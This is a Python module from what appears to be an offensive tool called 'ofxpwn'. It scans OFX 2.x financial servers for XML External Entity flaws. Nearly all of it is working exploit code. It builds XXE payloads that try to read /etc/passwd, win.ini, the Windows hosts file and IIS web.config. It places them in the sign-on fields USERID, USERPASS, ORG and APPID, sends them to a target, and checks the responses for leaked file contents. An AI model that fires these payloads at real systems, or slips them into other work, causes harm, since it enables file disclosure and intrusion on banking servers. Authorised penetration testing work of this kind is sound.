"""
XXE (XML External Entity) Testing Module

Tests for XXE vulnerabilities in OFX XML (2.x) implementations.
Attempts file disclosure, SSRF, and other XXE attack vectors.
"""

from pathlib import Path
from typing import Dict, Any, List
import re

from ofxpwn.core.base_module import BaseModule
from ofxpwn.core.config import Config
from ofxpwn.core.logger import Logger
from ofxpwn.core.sender import OFXSender


class XXEModule(BaseModule):
    """XXE vulnerability testing"""

    @classmethod
    def get_description(cls) -> str:
        return "Test for XML External Entity (XXE) vulnerabilities"

    def run(self, config: Config, logger: Logger) -> Dict[str, Any]:
        """Run XXE testing"""
        self.config = config
        self.logger = logger

        logger.info("="*60)
        logger.info("XXE (XML External Entity) Testing")
        logger.info("="*60)
        logger.warning("Testing for file disclosure and SSRF via XXE...")

        sender = OFXSender(config, logger)

        results = {
            'vulnerable': False,
            'payloads_tested': 0,
            'interesting_responses': []
        }

        org = config.get_target_org()
        fid = config.get_target_fid()

        # Test payloads
        test_cases = [
            {
                'name': 'Basic XXE - /etc/passwd',
                'file': 'file:///etc/passwd',
                'indicator': 'root:',
            },
            {
                'name': 'Basic XXE - Windows win.ini',
                'file': 'file:///c:/windows/win.ini',
                'indicator': '[extensions]',
            },
            {
                'name': 'XXE - Windows hosts',
                'file': 'file:///c:/windows/system32/drivers/etc/hosts',
                'indicator': '127.0.0.1',
            },
            {
                'name': 'XXE - IIS web.config',
                'file': 'file:///c:/inetpub/wwwroot/web.config',
                'indicator': '<configuration>',
            },
        ]

        for test_case in test_cases:
            logger.info(f"\nTesting: {test_case['name']}")

            # Build XXE payload
            xxe_payload = self._build_xxe_payload(
                test_case['file'],
                org,
                fid
            )

            # Send request
            result = sender.send_request(
                xxe_payload,
                save_name=f"xxe_{test_case['name'].replace(' ', '_').replace('/', '_')}"
            )

            results['payloads_tested'] += 1

            if not result.get('success'):
                logger.warning(f"Request failed: {result.get('error')}")
                continue

            # Check for vulnerability indicators
            response_text = result.get('response_text', '')
            http_status = result.get('http_status')

            logger.info(f"  HTTP Status: {http_status}")
            logger.info(f"  OFX Status: {result.get('ofx_status')}")

            # Check if file content is in response
            if test_case['indicator'].lower() in response_text.lower():
                logger.finding(
                    'CRITICAL',
                    'XXE File Disclosure Vulnerability',
                    f'Successfully read file via XXE: {test_case["file"]}',
                    f'File indicator "{test_case["indicator"]}" found in response'
                )
                results['vulnerable'] = True
                results['interesting_responses'].append({
                    'test': test_case['name'],
                    'file': test_case['file'],
                    'status': 'VULNERABLE'
                })

            # Check for error messages that might indicate processing
            elif any(err in response_text.lower() for err in ['parse error', 'xml', 'entity', 'dtd']):
                logger.info(f"  XML processing detected, but no file disclosure")
                results['interesting_responses'].append({
                    'test': test_case['name'],
                    'file': test_case['file'],
                    'status': 'XML_PROCESSING'
                })

            # Check for different response length (might indicate processing)
            elif result.get('is_unique'):
                logger.info(f"  Unique response - XXE might be processed")
                results['interesting_responses'].append({
                    'test': test_case['name'],
                    'file': test_case['file'],
                    'status': 'UNIQUE_RESPONSE'
                })

        # Test XXE in different XML fields
        logger.info("\nTesting XXE in various XML fields...")

        field_tests = [
            ('USERID', 'username'),
            ('USERPASS', 'password'),
            ('ORG', 'organization'),
            ('APPID', 'application_id'),
        ]

        for field_name, desc in field_tests:
            logger.info(f"  Testing XXE in <{field_name}> field...")

            payload = self._build_xxe_in_field_payload(field_name, org, fid)

            result = sender.send_request(
                payload,
                save_name=f"xxe_field_{field_name.lower()}"
            )

            if result.get('success'):
                response_text = result.get('response_text', '')

                # Check for file disclosure
                if 'root:' in response_text or '[extensions]' in response_text.lower():
                    logger.finding(
                        'CRITICAL',
                        f'XXE in {field_name} Field',
                        f'XXE vulnerability confirmed in <{field_name}> field',
                        'File content disclosed in response'
                    )
                    results['vulnerable'] = True

                results['payloads_tested'] += 1

        # Summary
        logger.info("\n" + "="*60)
        logger.info("XXE Testing Summary")
        logger.info("="*60)
        logger.info(f"Payloads tested: {results['payloads_tested']}")

        if results['vulnerable']:
            logger.warning("VULNERABLE: XXE vulnerability confirmed!")
            logger.warning("Server processes external entities and discloses file content")
        else:
            logger.success("No XXE vulnerabilities detected")
            if results['interesting_responses']:
                logger.info(f"Interesting responses: {len(results['interesting_responses'])}")
                logger.info("Review saved responses for potential blind XXE")

        stats = sender.get_stats()
        logger.info(f"\nRequests sent: {stats['requests_sent']}")

        return results

    def _build_xxe_payload(self, file_path: str, org: str, fid: str) -> str:
        """Build XXE payload targeting specific file"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "{file_path}">
]>
<?OFX OFXHEADER="200" VERSION="200" SECURITY="NONE" OLDFILEUID="NONE" NEWFILEUID="NONE"?>
<OFX>
<SIGNONMSGSRQV1>
  <SONRQ>
    <DTCLIENT>20251123000000.000[-5:EST]</DTCLIENT>
    <USERID>&xxe;</USERID>
    <USERPASS>test</USERPASS>
    <LANGUAGE>ENG</LANGUAGE>
    <FI>
      <ORG>{org or "TEST"}</ORG>
      <FID>{fid or "12345"}</FID>
    </FI>
    <APPID>QWIN</APPID>
    <APPVER>2700</APPVER>
  </SONRQ>
</SIGNONMSGSRQV1>
</OFX>'''

    def _build_xxe_in_field_payload(self, field_name: str, org: str, fid: str) -> str:
        """Build XXE payload targeting specific XML field"""
        # Try /etc/passwd for Unix-like systems
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<?OFX OFXHEADER="200" VERSION="200" SECURITY="NONE" OLDFILEUID="NONE" NEWFILEUID="NONE"?>
<OFX>
<SIGNONMSGSRQV1>
  <SONRQ>
    <DTCLIENT>20251123000000.000[-5:EST]</DTCLIENT>
    <{field_name}>&xxe;</{field_name}>
    <USERID>test</USERID>
    <USERPASS>test</USERPASS>
    <LANGUAGE>ENG</LANGUAGE>
    <FI>
      <ORG>{org or "TEST"}</ORG>
      <FID>{fid or "12345"}</FID>
    </FI>
    <APPID>QWIN</APPID>
    <APPVER>2700</APPVER>
  </SONRQ>
</SIGNONMSGSRQV1>
</OFX>'''
